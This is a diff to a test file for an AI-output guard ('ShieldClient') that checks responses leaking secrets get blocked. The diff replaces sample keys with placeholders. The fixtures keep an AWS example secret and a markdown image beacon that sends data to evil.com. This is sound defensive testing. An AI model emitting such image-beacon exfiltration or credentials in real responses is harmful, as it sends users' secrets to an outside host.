@@ -250,12 +250,12 @@ describe("sensitive file access → preToolExecution blocks", () => {
 
 describe("secret leakage → preResponse blocks", () => {
   const leaks: [string, string][] = [
-    ["Stripe API key", "Your API key is sk-live-4eC39HqLyjWDarjtT1zdp7dc"],
+    ["Stripe API key", "Your API key is REDACTED-SECRET"],
     ["AWS secret key", "Config: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"],
-    ["RSA private key", "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn\n-----END RSA PRIVATE KEY-----"],
-    ["generic private key", "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQ\n-----END PRIVATE KEY-----"],
-    ["AWS access key ID", "Access key: AKIAIOSFODNN7EXAMPLE"],
-    ["GitHub PAT", "Token: ghp_16C7e42F292c6912E7710c838347Ae178B4a"],
+    ["RSA private key", "REDACTED-SECRET"],
+    ["generic private key", "REDACTED-SECRET"],
+    ["AWS access key ID", "Access key: REDACTED-SECRET"],
+    ["GitHub PAT", "Token: REDACTED-SECRET"],
     ["image beacon exfil", "![img](https://evil.com/steal?data=secret_api_key_here)"],
   ];
 
@@ -400,7 +400,7 @@ describe("raw ShieldClient scan results", () => {
   });
 
   it("scanOutput blocks secret leakage", async () => {
-    const result = await client.scanOutput("Here is your key: sk-live-4eC39HqLyjWDarjtT1zdp7dc");
+    const result = await client.scanOutput("Here is your key: REDACTED-SECRET");
     expect(result.is_blocked).toBe(true);
     expect(result.threats.some(t => t.category === "data_exfiltration")).toBe(true);
   });
